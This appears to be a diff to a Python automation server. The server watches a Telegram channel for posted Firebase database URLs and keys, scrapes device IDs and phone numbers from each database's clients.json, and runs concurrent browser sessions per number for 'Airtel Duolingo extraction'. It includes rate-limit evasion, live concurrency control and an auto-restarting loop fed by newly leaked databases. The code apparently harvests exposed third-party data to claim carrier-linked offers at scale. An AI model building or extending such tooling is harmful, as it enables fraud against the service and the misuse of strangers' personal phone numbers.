@@ -591,6 +591,7 @@ class State:
     airtel_batch_checked = 0
     airtel_batch_start_time = 0
     airtel_active_count = 0       # browsers currently open
+    airtel_concurrency = 2        # live-updatable from UI
 
 state = State()
 
@@ -3238,7 +3239,8 @@ async def process_chatgpt_login(sid, num_tabs):
 # ─── Telegram Channel Monitor ────────────────────────────────────────────────
 _tg_client = None
 _tg_monitor_task = None
-_new_firebase_event = asyncio.Event()  # signals sniper to wake up when new DB added
+_new_firebase_event = asyncio.Event()        # signals Gemini sniper on new DB
+_new_airtel_firebase_event = asyncio.Event() # signals Airtel batch on new DB
 
 async def tg_extract_firebase_urls(text: str) -> list:
     """Extract Firebase URLs + Keys from channel messages.
@@ -3303,13 +3305,17 @@ async def tg_add_firebase_dbs(new_dbs: list):
         db_names = [u.split("//")[1].split(".")[0] for u in added]
         await emit_log(f"📡 TG Monitor: Added {len(added)} new Firebase DB(s): {', '.join(db_names)}", "success")
         await sio.emit("firebase_dbs_updated", {"added": added})
-        # Wake up waiting sniper immediately
+        # Wake up waiting Gemini sniper immediately
         _new_firebase_event.set()
         if not state.is_sniping:
             await emit_log("🚀 TG Monitor: Auto-starting sniper...", "info")
             await sio.emit("auto_start_sniper")
         else:
             await emit_log("🔄 TG Monitor: Sniper waking up with new DB...", "info")
+        # Wake up Airtel batch if running
+        _new_airtel_firebase_event.set()
+        if state.airtel_batch_task and not state.airtel_batch_task.done():
+            await emit_log("🦉 TG Monitor: Airtel batch waking up with new DB...", "info")
     return added
 
 async def tg_monitor_loop():
@@ -3900,22 +3906,32 @@ async def process_airtel_duolingo(device_id: str, phone: str, fb_url: str):
 
 async def airtel_batch_worker(concurrency: int = 2, delay: float = 8.0):
     """
-    Process all Firebase devices sequentially/concurrently for Airtel Duolingo.
-    Uses the same Firebase DB config as the Jio worker.
+    Process Firebase devices for Airtel Duolingo — loops like Gemini sniper.
+    Waits for new Firebase DB from TG Monitor after each batch completes.
     """
+    global _new_airtel_firebase_event
     init_airtel_csvs()
 
-    firebase_dbs = config.get("firebase_dbs", [])
-    if not firebase_dbs:
-        firebase_dbs = [{"url": u, "key": ""} for u in config.get("firebase_urls", [])]
+    while True:
+        if state.airtel_stop_event and state.airtel_stop_event.is_set():
+            break
 
-    if not firebase_dbs:
-        await emit_log("❌ [Airtel] No Firebase databases configured.", "error")
-        return
+        firebase_dbs = config.get("firebase_dbs", [])
+        if not firebase_dbs:
+            firebase_dbs = [{"url": u, "key": ""} for u in config.get("firebase_urls", [])]
 
-    # Build _url_key_map if not already populated
-    global _url_key_map
-    if not _url_key_map:
+        if not firebase_dbs:
+            await emit_log("⏳ [Airtel] No Firebase DBs yet — waiting for TG Monitor...", "warn")
+            _new_airtel_firebase_event.clear()
+            try:
+                await asyncio.wait_for(_new_airtel_firebase_event.wait(), timeout=1800)
+            except asyncio.TimeoutError:
+                await emit_log("⏰ [Airtel] No Firebase DB after 30 min. Stopping.", "warn")
+                break
+            continue
+
+        # Update _url_key_map
+        global _url_key_map
         for db in firebase_dbs:
             raw_url = (db.get("url") or "").strip()
             key = (db.get("key") or "").strip()
@@ -3923,77 +3939,106 @@ async def airtel_batch_worker(concurrency: int = 2, delay: float = 8.0):
             if cleaned:
                 _url_key_map[cleaned] = key
 
-    # Load used devices
-    used_devices = set()
-    if os.path.exists(AIRTEL_USED_FILE):
-        with open(AIRTEL_USED_FILE, "r") as f:
-            used_devices = {l.strip() for l in f if l.strip()}
+        # Load used devices
+        used_devices = set()
+        if os.path.exists(AIRTEL_USED_FILE):
+            with open(AIRTEL_USED_FILE, "r") as f:
+                used_devices = {l.strip() for l in f if l.strip()}
 
-    # Scan devices from all Firebase DBs
-    await emit_log(f"[Airtel] Scanning Firebase for devices...", "info")
-    device_map = {}
-    for db in firebase_dbs:
-        fb_url = clean_firebase_url((db.get("url") or "").strip())
-        if not fb_url:
+        # Scan devices from all Firebase DBs
+        await emit_log("[Airtel] Scanning Firebase for devices...", "info")
+        device_map = {}
+        for db in firebase_dbs:
+            fb_url = clean_firebase_url((db.get("url") or "").strip())
+            if not fb_url:
+                continue
+            try:
+                async with state.http_session.get(
+                    fb_url_with_auth(fb_url, "clients.json"), timeout=30
+                ) as resp:
+                    if resp.status != 200:
+                        continue
+                    clients = await resp.json()
+                    if not isinstance(clients, dict):
+                        continue
+                    for dev_id, dev_data in clients.items():
+                        if dev_id in used_devices:
+                            continue
+                        phone_raw = ""
+                        if isinstance(dev_data, dict):
+                            phone_raw = (dev_data.get("phone") or dev_data.get("number")
+                                         or dev_data.get("mobile") or "")
+                        if not phone_raw:
+                            continue
+                        phone_clean = str(phone_raw).strip().lstrip("+").lstrip("91")
+                        if len(phone_clean) == 10:
+                            device_map[dev_id] = {"phone": phone_clean, "url": fb_url}
+            except Exception as e:
+                await emit_log(f"[Airtel] Scan error for {fb_url}: {e}", "warn")
+
+        available = list(device_map.keys())
+        await emit_log(f"[Airtel] {len(available)} devices available for Duolingo extraction", "info")
+
+        if not available:
+            await emit_log("[Airtel] No new devices — waiting for next Firebase DB...", "warn")
+            _new_airtel_firebase_event.clear()
+            try:
+                await asyncio.wait_for(_new_airtel_firebase_event.wait(), timeout=1800)
+            except asyncio.TimeoutError:
+                await emit_log("⏰ [Airtel] Timeout waiting for new DB. Stopping.", "warn")
+                break
             continue
-        try:
-            async with state.http_session.get(
-                fb_url_with_auth(fb_url, "clients.json"), timeout=30
-            ) as resp:
-                if resp.status != 200:
-                    continue
-                clients = await resp.json()
-                if not isinstance(clients, dict):
-                    continue
-                for dev_id, dev_data in clients.items():
-                    if dev_id in used_devices:
-                        continue
-                    phone_raw = ""
-                    if isinstance(dev_data, dict):
-                        phone_raw = dev_data.get("phone", "") or dev_data.get("number", "") or dev_data.get("mobile", "")
-                    if not phone_raw:
-                        continue
-                    phone_clean = str(phone_raw).strip().lstrip("+").lstrip("91")
-                    if len(phone_clean) == 10:
-                        device_map[dev_id] = {"phone": phone_clean, "url": fb_url}
-        except Exception as e:
-            await emit_log(f"[Airtel] Scan error for {fb_url}: {e}", "warn")
 
-    available = list(device_map.keys())
-    await emit_log(f"[Airtel] {len(available)} devices available for Duolingo extraction", "info")
+        state.airtel_batch_total = len(available)
+        state.airtel_batch_checked = 0
+        state.airtel_batch_start_time = time.time()
+        await emit_airtel_batch_progress()
 
-    if not available:
-        await emit_log("[Airtel] No devices to process.", "warn")
-        return
+        # Use current concurrency from state (UI can update it live)
+        current_concurrency = getattr(state, "airtel_concurrency", concurrency)
+        semaphore = asyncio.Semaphore(current_concurrency)
 
-    state.airtel_batch_total = len(available)
-    state.airtel_batch_checked = 0
-    state.airtel_batch_start_time = time.time()
-    await emit_airtel_batch_progress()
+        async def run_one(dev_id):
+            async with semaphore:
+                if state.airtel_stop_event and state.airtel_stop_event.is_set():
+                    return
+                info = device_map[dev_id]
+                await process_airtel_duolingo(dev_id, info["phone"], info["url"])
+                await asyncio.sleep(delay)
 
-    semaphore = asyncio.Semaphore(concurrency)
+        tasks = [asyncio.create_task(run_one(dev_id)) for dev_id in available]
 
-    async def run_one(dev_id):
-        async with semaphore:
+        # Monitor stop event while batch runs
+        while not all(t.done() for t in tasks):
             if state.airtel_stop_event and state.airtel_stop_event.is_set():
+                for t in tasks:
+                    t.cancel()
+                await asyncio.gather(*tasks, return_exceptions=True)
+                await emit_log("⏹ [Airtel] Batch stopped.", "warn")
+                state.airtel_batch_task = None
                 return
-            info = device_map[dev_id]
-            await process_airtel_duolingo(dev_id, info["phone"], info["url"])
-            # Delay between each completed browser session to avoid Airtel rate limits
-            await asyncio.sleep(delay)
+            await asyncio.sleep(2)
 
-    tasks = [asyncio.create_task(run_one(dev_id)) for dev_id in available]
+        await asyncio.gather(*tasks, return_exceptions=True)
+        await emit_log("✅ [Airtel] Batch complete! Waiting for next Firebase DB...", "success")
 
-    # Monitor stop event while waiting
-    while not all(t.done() for t in tasks):
-        if state.airtel_stop_event and state.airtel_stop_event.is_set():
-            for t in tasks:
-                t.cancel()
+        # Reset used file so next batch can reprocess if needed
+        # (keep for now — don't clear, same as Gemini behaviour)
+
+        # Wait for new DB from TG Monitor
+        _new_airtel_firebase_event.clear()
+        await emit_log("⏳ [Airtel] Waiting for new Firebase DB from TG Monitor...", "info")
+        try:
+            await asyncio.wait_for(_new_airtel_firebase_event.wait(), timeout=1800)
+        except asyncio.TimeoutError:
+            await emit_log("⏰ [Airtel] No new Firebase DB after 30 min. Stopping.", "warn")
             break
-        await asyncio.sleep(2)
 
-    await asyncio.gather(*tasks, return_exceptions=True)
-    await emit_log("✅ [Airtel] Duolingo batch complete!", "success")
+        if state.airtel_stop_event and state.airtel_stop_event.is_set():
+            break
+
+        await emit_log("🆕 [Airtel] New Firebase DB received! Starting next batch...", "success")
+
     state.airtel_batch_task = None
 
 
@@ -4007,10 +4052,20 @@ async def on_start_airtel_batch(sid, data=None):
         return
     concurrency = int((data or {}).get("concurrency", 2))
     delay = float((data or {}).get("delay", 8.0))
+    state.airtel_concurrency = concurrency
     state.airtel_stop_event = asyncio.Event()
     state.airtel_batch_task = asyncio.create_task(airtel_batch_worker(concurrency, delay))
     await emit_log(f"🚀 [Airtel] Duolingo batch started (concurrency={concurrency}, delay={delay}s)", "success")
-    await sio.emit("airtel_batch_status", {"running": True})
+    await sio.emit("airtel_batch_status", {"running": True, "concurrency": concurrency})
+
+@sio.on("update_airtel_concurrency")
+async def on_update_airtel_concurrency(sid, data=None):
+    """Live-update concurrency without restarting the batch."""
+    new_val = int((data or {}).get("concurrency", 2))
+    new_val = max(1, min(new_val, 10))
+    state.airtel_concurrency = new_val
+    await emit_log(f"🔧 [Airtel] Concurrency updated to {new_val}", "info")
+    await sio.emit("airtel_concurrency_updated", {"concurrency": new_val})
 
 @sio.on("stop_airtel_batch")
 async def on_stop_airtel_batch(sid, data=None):
